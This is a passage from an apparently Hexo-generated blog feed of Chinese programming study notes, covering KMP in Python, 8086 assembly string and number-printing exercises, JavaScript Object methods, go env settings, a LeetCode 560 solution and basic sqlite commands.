        <content type="html"><![CDATA[<p>学习完KMP算法才发现编程如此的奇妙</p><h2 id="求next数组"><a href="#求next数组" class="headerlink" title="求next数组"></a>求next数组</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getNext</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    计算字符串的next数组</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    length = len(s)</span><br><span class="line">    next = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(length)]</span><br><span class="line">    next[<span class="number">0</span>] = <span class="number">-1</span></span><br><span class="line">    k = <span class="number">-1</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> j &lt; length<span class="number">-1</span>:</span><br><span class="line">        <span class="comment"># 这个 or 逻辑写的np</span></span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">-1</span> <span class="keyword">or</span> s[j] == s[k]:</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">            k += <span class="number">1</span></span><br><span class="line">            next[j] = k</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            k = next[k]</span><br><span class="line">    <span class="keyword">return</span> next</span><br></pre></td></tr></table></figure><p>从这张图可以看到整个的匹配过程，如果 $p_{k}$ 和 $p_{j}$ 匹配不上，那么就去看 $p_{next[k]}$ 和 $p_{j}$</p><p><img src= "/img/loading.gif" data-src="/posts/9bd3a30d/20150812214857858.png" alt></p><p>比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; &quot;ABCDABD&quot;</span><br></pre></td></tr></table></figure><p>得到的结果就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[-1, 0, 0, 0, 0, 1, 2]</span><br></pre></td></tr></table></figure><p>细节感觉还是要靠自己体会</p><h2 id="KMP算法"><a href="#KMP算法" class="headerlink" title="KMP算法"></a>KMP算法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">KMP</span><span class="params">(s,p)</span>:</span></span><br><span class="line">    next = getNext(p)</span><br><span class="line"></span><br><span class="line">    m,n = <span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> m &lt; len(s) <span class="keyword">and</span> n &lt; len(p):</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">-1</span> <span class="keyword">or</span> p[n] == s[m]:</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            m += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            n = next[n]</span><br><span class="line">    <span class="keyword">if</span> n == len(p):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>从头开始匹配即可，遇到匹配不上的情况就返回到 <code>next[k]</code></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/v_JULY_v/article/details/7041827" target="_blank" rel="noopener">https://blog.csdn.net/v_JULY_v/article/details/7041827</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KMP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编从入门到入土七</title>
      <link href="/posts/ce48dac5/"/>
      <url>/posts/ce48dac5/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sub al,al ZF&#x3D;1,PF&#x3D;1,SF</span><br><span class="line">mov al,1  ZF&#x3D;0,PF&#x3D;0,SF</span><br><span class="line">push ax</span><br><span class="line">pop bx</span><br><span class="line">add al,bl </span><br><span class="line">add al,10</span><br><span class="line">mul al</span><br></pre></td></tr></table></figure><h2 id="实验十"><a href="#实验十" class="headerlink" title="实验十"></a>实验十</h2><h3 id="打印字符"><a href="#打印字符" class="headerlink" title="打印字符"></a>打印字符</h3><blockquote><p>这里的重点是不知道字符串的长度，但是知道字符串十以0结尾的，所以利用 cx = 0 jcxz 会跳转，不断地置ch=0，当取到的字符cl=0时即可跳转</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">    db &#39;Welcome to masm!&#39;, 0</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">    mov dh,8 ;dh表示行号</span><br><span class="line">    mov dl,3 ;dl表示列号</span><br><span class="line">    mov cl,2 ;cl表示颜色</span><br><span class="line">    mov ax,data</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov si,0 ;字符串开始的位置</span><br><span class="line"></span><br><span class="line">    call show_str</span><br><span class="line">    mov ax,4c00h</span><br><span class="line">    int 21h</span><br><span class="line"></span><br><span class="line">show_str:</span><br><span class="line"></span><br><span class="line">    mov ax,0b800h</span><br><span class="line">    mov es,ax ;显存段</span><br><span class="line"></span><br><span class="line">    mov di,0</span><br><span class="line">    mov ax, 160</span><br><span class="line">    mul dh</span><br><span class="line">    add di,ax </span><br><span class="line"></span><br><span class="line">    mov al,2</span><br><span class="line">    mul dl</span><br><span class="line">    add di,ax ;计算开始的位置</span><br><span class="line"></span><br><span class="line">    mov bl,cl ;保存颜色，因为cx要用来计数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s:</span><br><span class="line">    mov cl, ds:[si] ;取出字符</span><br><span class="line">    mov ch,0 ;当cl&#x3D;0的时候,cx也等于0，此时执行jcxz</span><br><span class="line">    jcxz ok</span><br><span class="line">    mov es:[di], cl</span><br><span class="line">    mov es:[di+1], bl</span><br><span class="line">    add di,2</span><br><span class="line">    inc si</span><br><span class="line">    loop s</span><br><span class="line">ok: ret</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">    db 10 dup(0)</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">    mov ax,12666</span><br><span class="line">    mov bx,data</span><br><span class="line">    mov ds,bx</span><br><span class="line"></span><br><span class="line">    mov si,0</span><br><span class="line"></span><br><span class="line">    call dtoc</span><br><span class="line">    mov dh,8</span><br><span class="line">    mov dl,3</span><br><span class="line">    mov cl,2</span><br><span class="line">    call show_str</span><br><span class="line"></span><br><span class="line">    mov ax,4c00h</span><br><span class="line">    int 21h</span><br><span class="line">dtoc: mov si,9        </span><br><span class="line">   s0: mov cx,10</span><br><span class="line">       mov dx,00 ;dx存放余数</span><br><span class="line">       div cx</span><br><span class="line">       add dx,30H       </span><br><span class="line">       mov [si],dl</span><br><span class="line"></span><br><span class="line">       mov cx,ax ;判断商是否为0</span><br><span class="line">       jcxz rt        </span><br><span class="line"></span><br><span class="line">       dec si</span><br><span class="line">       inc cx  ;防止cx&#x3D;1的时候意外退出循环</span><br><span class="line">       loop s0</span><br><span class="line">rt: ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show_str:</span><br><span class="line"></span><br><span class="line">    mov ax,0b800h</span><br><span class="line">    mov es,ax ;显存段</span><br><span class="line"></span><br><span class="line">    mov di,0</span><br><span class="line">    mov ax, 160</span><br><span class="line">    mul dh</span><br><span class="line">    add di,ax </span><br><span class="line"></span><br><span class="line">    mov al,2</span><br><span class="line">    mul dl</span><br><span class="line">    add di,ax ;计算开始的位置</span><br><span class="line"></span><br><span class="line">    mov bl,cl ;保存颜色，因为cx要用来计数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s:</span><br><span class="line">    mov cl, ds:[si] ;取出字符</span><br><span class="line">    mov ch,0 ;当cl&#x3D;0的时候,cx也等于0，此时执行jcxz</span><br><span class="line">    jcxz ok</span><br><span class="line">    mov es:[di], cl</span><br><span class="line">    mov es:[di+1], bl</span><br><span class="line">    add di,2</span><br><span class="line">    inc si</span><br><span class="line">    loop s</span><br><span class="line">ok: ret</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js学习笔记</title>
      <link href="/posts/ff9e87b6/"/>
      <url>/posts/ff9e87b6/</url>
      
        <content type="html"><![CDATA[<h2 id="Object对象"><a href="#Object对象" class="headerlink" title="Object对象"></a>Object对象</h2><h3 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h3><p>Object.keys()，Object.getOwnPropertyNames()</p><p>可以用来遍历对象的属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj1 = &#123;</span><br><span class="line">    <span class="string">"name"</span>:<span class="string">"pxy"</span>,</span><br><span class="line">    <span class="string">"age"</span>:<span class="number">12</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//undefined</span></span><br><span class="line"><span class="built_in">Object</span>.getOwnPropertyNames(obj1)</span><br><span class="line"></span><br><span class="line"><span class="comment">//(2) ["name", "age"]</span></span><br></pre></td></tr></table></figure><h3 id="实例方法"><a href="#实例方法" class="headerlink" title="实例方法"></a>实例方法</h3><p>Object.protype上定义的方法就是实例方法，能够被Object的实例调用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.getOwnPropertyNames(<span class="built_in">Object</span>.prototype)</span><br><span class="line"></span><br><span class="line">(<span class="number">12</span>) [<span class="string">"constructor"</span>, <span class="string">"__defineGetter__"</span>, <span class="string">"__defineSetter__"</span>, <span class="string">"hasOwnProperty"</span>, <span class="string">"__lookupGetter__"</span>, <span class="string">"__lookupSetter__"</span>, <span class="string">"isPrototypeOf"</span>, <span class="string">"propertyIsEnumerable"</span>, <span class="string">"toString"</span>, <span class="string">"valueOf"</span>, <span class="string">"__proto__"</span>, <span class="string">"toLocaleString"</span>]</span><br><span class="line"><span class="number">0</span>: <span class="string">"constructor"</span></span><br><span class="line"><span class="number">1</span>: <span class="string">"__defineGetter__"</span></span><br><span class="line"><span class="number">2</span>: <span class="string">"__defineSetter__"</span></span><br><span class="line"><span class="number">3</span>: <span class="string">"hasOwnProperty"</span></span><br><span class="line"><span class="number">4</span>: <span class="string">"__lookupGetter__"</span></span><br><span class="line"><span class="number">5</span>: <span class="string">"__lookupSetter__"</span></span><br><span class="line"><span class="number">6</span>: <span class="string">"isPrototypeOf"</span></span><br><span class="line"><span class="number">7</span>: <span class="string">"propertyIsEnumerable"</span></span><br><span class="line"><span class="number">8</span>: <span class="string">"toString"</span></span><br><span class="line"><span class="number">9</span>: <span class="string">"valueOf"</span></span><br><span class="line"><span class="number">10</span>: <span class="string">"__proto__"</span></span><br><span class="line"><span class="number">11</span>: <span class="string">"toLocaleString"</span></span><br><span class="line">length: <span class="number">12</span></span><br><span class="line">__proto__: <span class="built_in">Array</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>这些方法是所有对象都公有的</p><h3 id="valueOf-NaN"><a href="#valueOf-NaN" class="headerlink" title="valueOf"></a>valueOf</h3><p><code>valueOf</code>方法的作用是返回一个对象的“值”，默认情况下返回对象本身。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">obj.valueOf() === obj <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>但是这种情况除外：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var a &#x3D; new Object(1)</span><br><span class="line">a.valueOf() &#x3D;&#x3D;&#x3D; a &#x2F;&#x2F; false</span><br></pre></td></tr></table></figure><p><code>valueOf</code>方法的主要用途是，JavaScript 自动类型转换时会默认调用这个方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"><span class="number">1</span> + obj </span><br><span class="line"><span class="comment">//"1[object Object]"</span></span><br></pre></td></tr></table></figure><p>可以重写 <code>valueOf</code> 方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">obj.valueOf = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">1</span>+obj</span><br><span class="line"><span class="comment">//3</span></span><br></pre></td></tr></table></figure><p>这个很好理解，因为obj查找 <code>valueOf</code> 函数，会先从自己的属性开始找，找不到就通过 <code>__proto__</code> 找上层对象的<code>valueOf</code> 属性</p><h2 id="编码风格"><a href="#编码风格" class="headerlink" title="编码风格"></a>编码风格</h2><h3 id="switch-case-结构"><a href="#switch-case-结构" class="headerlink" title="switch case 结构"></a>switch case 结构</h3><p>不推荐如下的方式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doAction</span>(<span class="params">action</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> (action) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'hack'</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'hack'</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'slash'</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'slash'</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'run'</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'run'</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Invalid action.'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>推荐使用对象的方式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doAction</span>(<span class="params">action</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> actions = &#123;</span><br><span class="line">    <span class="string">'hack'</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'hack'</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">'slash'</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'slash'</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">'run'</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'run'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> actions[action] !== <span class="string">'function'</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Invalid action.'</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> actions[action]();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更加简洁</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go相关笔记</title>
      <link href="/posts/e0759275/"/>
      <url>/posts/e0759275/</url>
      
        <content type="html"><![CDATA[<h2 id="go相关命令"><a href="#go相关命令" class="headerlink" title="go相关命令"></a>go相关命令</h2><h3 id="go-env"><a href="#go-env" class="headerlink" title="go env"></a>go env</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">go env -w GOPROXY&#x3D;https:&#x2F;&#x2F;goproxy.io,direct</span><br><span class="line"># Set environment variable allow bypassing the proxy for selected modules</span><br><span class="line">go env -w GOPRIVATE&#x3D;*.corp.example.com</span><br><span class="line">go env -w GO111MODULE&#x3D;on</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一道leetcode-560和为k的子数组</title>
      <link href="/posts/eb2e19c0/"/>
      <url>/posts/eb2e19c0/</url>
      
        <content type="html"><![CDATA[<p>给定一个整数数组和一个整数 k，你需要找到该数组中和为 k 的连续的子数组的个数。</p><p>示例 1 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入:nums &#x3D; [1,1,1], k &#x3D; 2</span><br><span class="line">输出: 2 , [1,1] 与 [1,1] 为两种不同的情况。</span><br></pre></td></tr></table></figure><h2 id="法一——暴力"><a href="#法一——暴力" class="headerlink" title="法一——暴力"></a>法一——暴力</h2><p>两重循环，对每一个数字，从它开始往后，不断地累加，然后和k进行对比，这应该是最简单的想法了，但是我做这种题还是有点晕</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">subarraySum</span><span class="params">(nums, k)</span>:</span></span><br><span class="line">    length = len(nums)</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">        sum = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i, length):</span><br><span class="line">            sum += nums[j]</span><br><span class="line">            <span class="keyword">if</span> sum == k:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> count</span><br></pre></td></tr></table></figure><h2 id="法二——hashtables"><a href="#法二——hashtables" class="headerlink" title="法二——hashtables"></a>法二——hashtables</h2><p>思路就是不断地求和，然后判断 <code>cur_sum - k</code> 是否已经计算过了</p><blockquote><p>将前缀和放入哈希表，哈希表的设计为：key是前缀和，value是前缀和出现的次数。<br>如果当前要存入的前缀和sum，使得(sum - k)也在哈希表中时，则使用count累加哈希表中(sum - k)出现的次数，然后再将该sum放入哈希表中。这里的count与sum的添加次序不能调换，主要是为了处理k为0的情况。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">subarraySum</span><span class="params">(self, nums, k)</span>:</span></span><br><span class="line">    result, cur_sum = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    sum_dict = &#123;<span class="number">0</span>:<span class="number">1</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">        cur_sum += num</span><br><span class="line">        <span class="keyword">if</span> cur_sum - k <span class="keyword">in</span> sum_dict:</span><br><span class="line">            result += sum_dict[cur_sum - k]</span><br><span class="line">        sum_dict[cur_sum] = sum_dict.get(cur_sum, <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>go实现的代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">subarraySum</span><span class="params">(nums []<span class="keyword">int</span>, k <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    count := <span class="number">0</span></span><br><span class="line">    sumMap := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>&#123;<span class="number">0</span>:<span class="number">1</span>,&#125;</span><br><span class="line">    sum := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _, num := <span class="keyword">range</span> nums &#123;</span><br><span class="line">        sum += num</span><br><span class="line">        <span class="keyword">if</span> sumMap[sum - k] &gt; <span class="number">0</span> &#123;</span><br><span class="line">            count += sumMap[sum - k]</span><br><span class="line">        &#125;</span><br><span class="line">        sumMap[sum]++</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> count</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlite数据库笔记</title>
      <link href="/posts/532a05c/"/>
      <url>/posts/532a05c/</url>
      
        <content type="html"><![CDATA[<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p><code>.quit</code> 退出</p><p><code>.tables</code> 列出所有的表</p><p><code>.schema</code> 查看构建表的sql语句</p><p><code>.database</code> 查看数据库</p><h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><p>只需要 <code>sqlite</code> 加上数据库名即可</p><h2 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE user(</span><br><span class="line">ID INT NOT NULL PRIMARY KEY,</span><br><span class="line">name TEXT ,</span><br><span class="line">age TEXT,</span><br><span class="line">password TEXT);</span><br></pre></td></tr></table></figure><p><strong>sqlite不支持修改表已经存在的字段</strong>，只能把原有的表重命名一下再创建一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table user rename to &#96;user_123&#96;;</span><br></pre></td></tr></table></figure><p>如果主键要求自动递增</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">user</span>(</span><br><span class="line"><span class="keyword">ID</span> <span class="built_in">INTEGER</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> PRIMARY <span class="keyword">KEY</span> AUTOINCREMENT,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">TEXT</span>,</span><br><span class="line"><span class="keyword">password</span> <span class="built_in">TEXT</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into user(name,password) values(&quot;pxy&quot;, &#39;123456&#39;);</span><br></pre></td></tr></table></figure><h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlite&gt; select * from user;</span><br><span 